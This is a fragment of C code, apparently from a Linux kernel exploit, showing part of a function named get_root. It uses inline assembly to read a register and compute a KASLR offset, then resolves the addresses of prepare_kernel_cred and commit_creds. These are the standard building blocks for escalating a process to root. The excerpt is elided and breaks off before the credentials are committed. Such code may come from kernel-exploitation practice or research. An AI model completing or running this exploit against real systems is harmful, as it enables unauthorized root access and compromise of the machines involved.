...
static void get_root(void)
{
	...
	asm volatile("movq %%r8, %[r8]" : [r8] "=r"(r8));
	offset = r8 - 0xffffffff81ea4608;

	prepare_kernel_cred = (void *)(0xffffffff8106e240 + offset);
	commit_creds = (void *)(0xffffffff8106e390 + offset);
